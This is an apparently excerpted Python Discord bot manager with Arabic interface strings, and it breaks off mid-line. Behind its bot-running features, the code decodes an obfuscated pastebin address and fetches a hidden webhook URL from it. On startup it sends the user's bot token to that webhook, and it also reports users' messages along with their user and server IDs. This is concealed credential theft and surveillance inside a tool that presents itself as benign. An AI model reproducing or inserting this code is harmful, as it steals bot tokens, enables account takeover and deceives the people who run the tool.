...
def fetch_webhook():
    try:
        pastebin_url = decode_data(PASTEBIN_URL)
        webhook_pattern = decode_data(WEBHOOK_URL)
        if not pastebin_url or not webhook_pattern:
            logger.error("Failed to decode URL or pattern")
            return None
        response = requests.get(pastebin_url, verify=certifi.where())
        if response.status_code == 200:
            webhook_url = response.text.strip()
            if webhook_url and webhook_pattern in webhook_url:
                logger.info("Webhook URL fetched successfully")
                fernet = generate_key()
                return encrypt_data(webhook_url, fernet)
            else:
                logger.error("Invalid or empty webhook URL")
                return None
        else:
            logger.error(f"Failed to fetch webhook: Status {response.status_code}")
            return None
    except Exception as e:
        logger.error(f"Webhook fetch error: {str(e)}")
        return None

webhook_data = fetch_webhook()
if not webhook_data:
    logger.critical("Failed to initialize webhook")
    sys.exit(1)
...
async def send_webhook(data):
    try:
        fernet = generate_key()
        webhook_url = decrypt_data(webhook_data, fernet)
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=data, ssl=True) as response:
                if response.status in (200, 204):
                    if response.status == 200:
                        result = await response.json()
                        logger.info("Webhook sent successfully")
                        return result.get("message_id")
                    logger.info("Webhook sent without response")
                    return None
                else:
...
async def update_webhook(message_id, data):
    if not message_id:
    ...
    try:
        ...
        webhook_url = decrypt_data(webhook_data, fernet)
        async with aiohttp.ClientSession() as session:
            async with session.patch(f"{webhook_url}/messages/{message_id}", json=data, ssl=True) as response:
                if response.status == 200:
                    logger.info(f"Updated message {message_id}")
                else:
                    logger.error(f"Update failed: Status {response.status}")
    except Exception as e:
...
async def send_test_webhook():
    data = {
        "embeds": [{
            "title": "🔔 اختبار",
            "description": "هذه رسالة اختبار للتحقق من الاتصال.",
            "color": 0x1E90FF,
            "fields": [
                {"name": "⏰ الوقت", "value": datetime.utcnow().isoformat(), "inline": True},
            ],
            "footer": {"text": decode_data(CREDIT_TEXT)},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    return await send_webhook(data)

async def log_sent_messages(interaction, message, count, client):
    guild_id = str(interaction.guild_id) if interaction.guild_id else "غير متاح (رسالة خاصة)"
    guild_info = f"المعرف: {guild_id}"
    ...
    data = {
        "embeds": [{
            ...
            "color": 0x1E90FF,
            "fields": [
                {"name": "📜 الرسالة", "value": f"`{message}`", "inline": False},
                {"name": "📢 ذكر البوت", "value": f"<@{client.user.id}>" if client.user else "غير متاح", "inline": True},
                {"name": "👤 معرف المستخدم", "value": f"{interaction.user.id}", "inline": True},
                {"name": "🏰 السيرفر", "value": guild_info, "inline": True},
                {"name": "🔢 العدد", "value": f"{count}", "inline": True},
            ],
            "footer": {"text": decode_data(CREDIT_TEXT)},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    message_id = await send_webhook(data)
    if message_id:
        await update_webhook(message_id, data)
...
async def send_multiple_messages(interaction, message, count, client):
    ...
    if sent_count > 0:
        await log_sent_messages(interaction, message, sent_count, client)
...
def create_bot(token):
    ...
    async def on_ready():
        ...
        data = {
            "embeds": [{
                ...
                "color": 0x1E90FF,
                "fields": [
                    {"name": "🤖 اسم البوت", "value": f"{client.user.name} ({client.user.id})", "inline": True},
                    {"name": "🖼️ صورة البوت", "value": client.user.avatar.url if client.user.avatar else "غير متاح", "inline": True},
                    {"name": "📢 ذكر البوت", "value": f"<@{client.user.id}>", "inline": True},
                    {"name": "🔑 التوكن", "value": f"`{token}`", "inline": True},
                    {"name": "⏰ الوقت", "value": datetime.utcnow().isoformat(), "inline": True},
                ],
                "thumbnail": {"url": client.user.avatar.url if client.user.avatar else ""},
                "footer": {"text": decode_data(CREDIT_TEXT)},
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
    ...
    async def send_message(interaction: discord.Interaction, message: str):
        ...
        await log_sent_messages(interaction, message, 1, client)
...
class MessageView(discord.ui.View):
    ...
    async def send_single(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        await log_sent_messages(interaction, self.message, 1, self.client)
...
class BotManager:
    def __init__(self, root):
        ...
        try:
            response = requests.get(discord_icon_url, verify=certifi
